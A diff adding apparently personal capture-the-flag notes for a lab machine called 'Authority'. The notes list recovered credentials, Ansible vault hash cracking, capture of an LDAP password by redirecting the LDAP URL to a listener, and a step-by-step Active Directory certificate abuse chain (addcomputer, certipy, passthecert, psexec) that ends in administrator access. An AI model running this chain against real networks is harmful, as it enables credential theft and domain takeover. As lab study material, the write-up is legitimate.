@@ -1,0 +1,106 @@
+        Sharename       Type      Comment
+        ---------       ----      -------
+        ADMIN$          Disk      Remote Admin
+        C$              Disk      Default share
+        Department Shares Disk      
+        Development     Disk      
+        IPC$            IPC       Remote IPC
+        NETLOGON        Disk      Logon server share 
+        SYSVOL          Disk      Logon server share
+        
+sudo rdate -n 10.10.11.222 --> Sync Clock to run Kerburos Attacks
+
+tomcat used on the machine
+
+admin:T0mc@tAdm1n
+robot:T0mc@tAdm1n
+
+user:SuP3rS3creT
+user:S3creT
+
+user:password
+
+ansible:Welcome1
+ldap_admin:!vault
+pwn_admin:!vault
+
+system_ldap_bind:sunrise
+
+Development ==> Anyone can view
+Department Shares ==> Need working credential to view possibly
+
+https://10.10.11.222:8443/ ==> Website
+
+Looking at PWM main.yml there are ansible vault hashes we can set up to give to john
+
+After formatting the hashes like:
+
+$ANSIBLE_VAULT;1.1;AES256
+32666534386435366537653136663731633138616264323230383566333966346662313161326239
+6134353663663462373265633832356663356239383039640a346431373431666433343434366139
+35653634376333666234613466396534343030656165396464323564373334616262613439343033
+6334326263326364380a653034313733326639323433626130343834663538326439636232306531
+3438
+
+running them in ansible2john then thru john we get this password : !@#$%^&*
+
+ansible-vault decrypt ansibleHash [ !@#$%^&* ] --> decrypts successfully
+
+svc_pwm:pWm_@dm!N_!23 ==> PWM Cred
+:DevT3st@123 ==> Ldap admin password
+
+--------------------------------------------------------------------
+ldaps://authority.authority.htb:636
+
+LDAP Proxy User
+CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb
+
+LDAP Contextless Login Roots
+CN=Users,DC=authority,DC=htb
+
+Administrator Permission
+
+Config Password Hash : $2a$10$gC/eoR5DVUShlZV4huYlg.L2NtHHmwHIxF3Nfid7FfQLoh17Nbnua
+
+{"type":"ldapUser","ldapBase":"CN=svc_pwm,CN=Users,DC=authority,DC=htb"}
+
+Security Key:
+ENC-PW:qLz5jzV3Vmxdnsy8pGvrW6RdQnoaRPmUZvZiU8z/3xeC792eSB1nBkxU07e2acg6Kue/Um6dkZm1RrcECBHk358zc045rDyFL2fDku2kusl79NE+Tww8gC8QQ0CX+VS2yyD46+ZS6Jriyu1Y7BOXnJifXXXsHzTmBTkodvnY33V6Puc0Zze0PGYHN+CGFtx/g5WaBTQbQwZwNLA+8Qe11GqCz+rBjGzQp0w6yLHJn+ZYBlLWgvZwN2KUHOiUIq5eKKDgjv+mga4zcB1STcpMJRaIiSnLdY3VCfsEj6p4BGz9jj+N7gQHBFAvI05JexXq8HyL7ZUEzLXU5FMQXvhhWSbhxoz7LH/iamvoOg13WnI3MRUzrXv91Uh7gdNZuXa1NmSBOe/g1GgmFV+0sxLIJ/99VT+GHIwrfjPNNV6jtKHhURPwp0a38c6aBGjpvB3AgAoZ0/KVLvQK1pAevO4NK2XFF2nPD8gQCQJMCsb62I+XMitkO2zKytrYEwZhl9VUGF0bAXQhC5I9xX1tEQAGBcENt1NGfM8iE+PlrZWwlr1yDjw+GZEm2KHyjnUFpBubqD7l7mvEJbEV26SQkR0v4R5LSEPbElOKGbGXMKkDEi53SQ5P0ZZQbega9XtBOHs+/s1EZ4p/qGVCvpD9dgc0SyS0auXU0PUddjxyXthHdqRbEWHhAduXYQgXF0eM2yWlbd7fTgSUMERlpjdFX/QZG3D6Ghp+iOCwfelEfKMQDO1myQcpq5YTE94YDz+aSWvi7ZGRIq+hRkwuR8E0EbEUE7CApDwF3LjGi+UEd9Y3Q9SPSMVxg4Ra2FB4sYCT19N7KV3TpGvJYD4SE8Mrn0cH9ihvlvDJFOxoLC9xM8FA9EAvSZN1w6lV4pUsVpUSM0LRKLqCmBCRJvaRNbhRymM96NFSSi4PwCCJQ7WVJjiS+oLQ+7qwHhqLQFy0+gtkGSQnBoq1FMYSCyGz/fUG84Xe0CSTPt4SwTq+L2M2jqsiB+HXq1z2LdkAFo6xm1Mqs6H/x5ZP1esjvRxDzHod31jRizu+rJw4LNRb172A36dQWmiq/OJQBJrnPu87s+KmoNyCJGrT2+1QttMgM62qy2/Eb6xByQ8RiLl6v87vf24TuWhxJhXfNWMRuHXJp2IWt5BWAYdiQNUjCuvRhfiyxsIqelpEpsOnm8WDVEsN0hqaEt9Db2e/d3Wpx1as4luVtA/MZtKy+gsH0qZUmouj7LCfN5TJpm00MiBTxYSkapKvAGchkE4UVc3AHGIxeyy+t2LwqT9fDSlS/VofOELNcQD3OfPi+asOrgaqcRbZVXdQumoJsubLMiPpHTZtOH2Nt13cEh9ZG/XebrAkchsMjsyLo5KX0nL6RKbMNUA3BmM2cd+bjj+Jar2aeAeqBdW+LU5ALshAsF986N1BGSsQ8aZkJwLi3PUYG8vGR88ZqEMMziQ=
+
+
+
+UserPermission: LDAP User: [Profile: All User: CN=svc_pwm,CN=Users,DC=authority,DC=htb]
+--------------------------------------------------------------------
+
+evil-winrm -i 10.10.11.222 -u svc_pwm ==> login via evil-winrm [svc_pwm isnt a user on the box!]
+
+ldapsearch -x -H ldap://10.10.11.222:389 -s sub -b 'DC=authority,DC=htb' -D 'authority.htb\svc_ldap' -w 'DevT3st@123' ==> If we get a working ldap credential we can use this cmd to dump ldap
+
+If you get NC to hit you with a ldap req you can get the 'lDaP_1n_th3_cle4r!' in plain text
+
+evil-winrm -i 10.10.11.222 -u svc_ldap ==> user on the machine! [svc_ldap:lDaP_1n_th3_cle4r!]
+
+	NOTE:
+What you can also do and is more prefered --> Have the LDAP URL point back to you, then run `sudo responder -i tun0`
+this will get you the password from the message and format it nicely for best readability!
+
+type user.txt ==> same as cat user.txt
+
+user:54caf5c8be2d66f9ea79ce294e3852e4
+===========================================================
+
+When we check our user privilages using `whoami /priv` we can see that we have the permission to add workspaces (computers) into the Active Directory [AD]
+Using Impacket Scripts we can do just that, we'll need to use:
+	impacket-addcomputer ==> Add workspace
+	certipy-ad ==> Request Certificate to impersonate Administrator@authority.htb
+	passthecert.py ==> Allows us to modify Administrators password and gives us a newly randomly made password
+	impacket-psexec ==> Allows us to login via Administrator Creds Forged
+
+1.) impacket-addcomputer -dc-ip 10.10.11.222 -computer-name "name$" -computer-pass "Password" 'authority.htb/svc_ldap:lDaP_1n_th3_cle4r!' --> Add new PC
+2.) certipy-ad find -u "svc_ldap" -p 'lDaP_1n_th3_cle4r!' -dc-ip 10.10.11.222 ==> gives us the value for the -ca in the next step
+3.) certipy-ad req -u "enderPC$" -p 'Password1' -template CorpVPN  -dc-ip 10.10.11.222 -ca AUTHORITY-CA -upn 'Administrator@authority.htb' --> Get Cert
+4.) certipy-ad cert -pfx administrator.pfx -nokey -out user.crt; certipy-ad cert -pfx administrator.pfx -nocert -out user.key --> break down Cert
+5.) passthecert.py -action modify_user -crt user.crt -key user.key -domain authority.htb -dc-ip 10.10.11.222 -target administrator -new-pass --> change password
+6.) impacket-psexec administrator:uF6UunnDGzW9X3g4Ei2Rh9CarmTHkDJ7@authority.htb --> login as Admin
+
+Now we are System!
